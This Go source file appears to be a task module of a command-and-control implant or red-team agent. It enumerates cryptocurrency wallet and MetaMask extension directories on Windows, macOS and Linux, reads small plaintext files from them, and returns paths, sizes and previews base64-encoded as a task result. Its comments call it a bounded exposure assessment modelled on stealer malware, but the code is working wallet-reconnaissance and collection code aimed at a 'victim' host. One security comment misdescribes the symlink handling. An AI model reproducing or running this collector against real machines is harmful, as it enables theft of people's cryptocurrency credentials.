//go:build linux || windows || darwin
// +build linux windows darwin

package main

// wallet_collect enumerates cryptocurrency wallet client and browser-extension
// data directories and reports what is present (path + size, plus a bounded
// preview of small text files). This is a data-exposure assessment primitive —
// it answers "which wallets are installed and what plaintext material sits on
// disk", which is the same reconnaissance the in-the-wild reports describe
// (PureRAT, PhotoCraft). It deliberately does NOT decrypt keys or private
// material: it reports presence and exposes only small text configuration
// files, under hard caps, so a result can never become an unbounded exfiltration.
//
// Registration + approval gating live in the task registry and dangerousTaskTypes.

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"unicode/utf8"
)

const (
	walletMaxFiles      = 200
	walletMaxFileBytes  = 256 << 10 // skip files larger than this entirely
	walletMaxPreviewLen = 2048      // bytes of a small text file included in the report
	walletMaxTotalBytes = 4 << 20   // cumulative bytes across all included previews
)

// walletTarget is one known wallet data location. `dir` is walked; `label`
// identifies the wallet in the report.
type walletTarget struct {
	label string
	dir   string
}

// walletTargets returns the known data directories for a platform. Paths are
// derived from the supplied home (and Windows APPDATA/LOCALAPPDATA equivalents
// passed in) so the function is pure and testable with a temp directory.
func walletTargets(goos, home, appdata, localappdata string) []walletTarget {
	var targets []walletTarget
	add := func(label, p string) {
		if p != "" {
			targets = append(targets, walletTarget{label: label, dir: p})
		}
	}
	switch goos {
	case "windows":
		add("Exodus", filepath.Join(appdata, "Exodus"))
		add("Electrum", filepath.Join(appdata, "Electrum"))
		add("Ledger Live", filepath.Join(appdata, "Ledger Live"))
		add("Trezor Suite", filepath.Join(appdata, "Trezor Suite"))
		add("Atomic Wallet", filepath.Join(appdata, "atomic"))
		add("MetaMask (Chrome)", filepath.Join(localappdata, "Google", "Chrome", "User Data", "Default", "Local Extension Settings"))
		add("MetaMask (Edge)", filepath.Join(localappdata, "Microsoft", "Edge", "User Data", "Default", "Local Extension Settings"))
	case "darwin":
		add("Exodus", filepath.Join(home, "Library", "Application Support", "Exodus"))
		add("Electrum", filepath.Join(home, "Library", "Application Support", "Electrum"))
		add("Ledger Live", filepath.Join(home, "Library", "Application Support", "Ledger Live"))
		add("Trezor Suite", filepath.Join(home, "Library", "Application Support", "Trezor Suite"))
		add("MetaMask (Chrome)", filepath.Join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Local Extension Settings"))
	default: // linux and other unix
		add("Exodus", filepath.Join(home, ".config", "Exodus"))
		add("Electrum", filepath.Join(home, ".electrum"))
		add("Ledger Live", filepath.Join(home, ".config", "Ledger Live"))
		add("Trezor Suite", filepath.Join(home, ".config", "Trezor Suite"))
		add("MetaMask (Chrome)", filepath.Join(home, ".config", "google-chrome", "Default", "Local Extension Settings"))
	}
	return targets
}

func walletHome() string {
	if h, err := os.UserHomeDir(); err == nil && h != "" {
		return h
	}
	return os.Getenv("HOME")
}

// collectWalletFromTargets walks each target directory and builds a bounded
// report. Symlinks are never followed (a wallet dir can be booby-trapped with
// a link to an arbitrary host file); only regular files are considered.
func collectWalletFromTargets(targets []walletTarget) string {
	var sb strings.Builder
	files := 0
	total := 0
	for _, t := range targets {
		if files >= walletMaxFiles {
			break
		}
		info, err := os.Lstat(t.dir)
		if err != nil || !info.IsDir() {
			continue // absent wallet is the common case; not an error
		}
		found := false
		_ = filepath.WalkDir(t.dir, func(path string, d os.DirEntry, walkErr error) error {
			if walkErr != nil || files >= walletMaxFiles {
				return nil // keep walking siblings; never fail the whole report
			}
			if d.Type()&os.ModeSymlink != 0 {
				// Skip only the link itself. Returning SkipDir here would skip
				// every remaining sibling in the directory (WalkDir treats a
				// symlink entry as a leaf), hiding the real wallet files.
				return nil
			}
			if d.IsDir() {
				return nil
			}
			fi, err := d.Info()
			if err != nil || !fi.Mode().IsRegular() {
				return nil
			}
			found = true
			rel, _ := filepath.Rel(t.dir, path)
			fmt.Fprintf(&sb, "%s\t%s\t%d bytes\n", t.label, rel, fi.Size())
			if fi.Size() <= walletMaxPreviewLen && total+int(fi.Size()) <= walletMaxTotalBytes {
				// #nosec G122 -- symlinks are explicitly skipped above (d.Type()&ModeSymlink
				// returns SkipDir) and the walk is over the victim's own wallet tree, so the
				// read is scoped to files we just LStat'd in this callback.
				if b, err := os.ReadFile(path); err == nil && utf8.Valid(b) && strings.IndexFunc(string(b), func(r rune) bool { return r < 0x20 && r != '\n' && r != '\t' && r != '\r' }) == -1 {
					fmt.Fprintf(&sb, "  preview: %q\n", string(b))
					total += len(b)
				}
			}
			files++
			return nil
		})
		if !found {
			fmt.Fprintf(&sb, "%s\t<no files>\n", t.label)
		}
	}
	if files == 0 && len(targets) == 0 {
		return "no wallet targets for this platform\n"
	}
	if sb.Len() == 0 {
		return "no wallet data directories found\n"
	}
	return sb.String()
}

func collectWalletData() string {
	home := walletHome()
	targets := walletTargets(runtime.GOOS, home, os.Getenv("APPDATA"), os.Getenv("LOCALAPPDATA"))
	return collectWalletFromTargets(targets)
}

func handleWalletCollect(task Task, res *TaskResult) {
	out := collectWalletData()
	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
	res.Encoding = "base64"
}
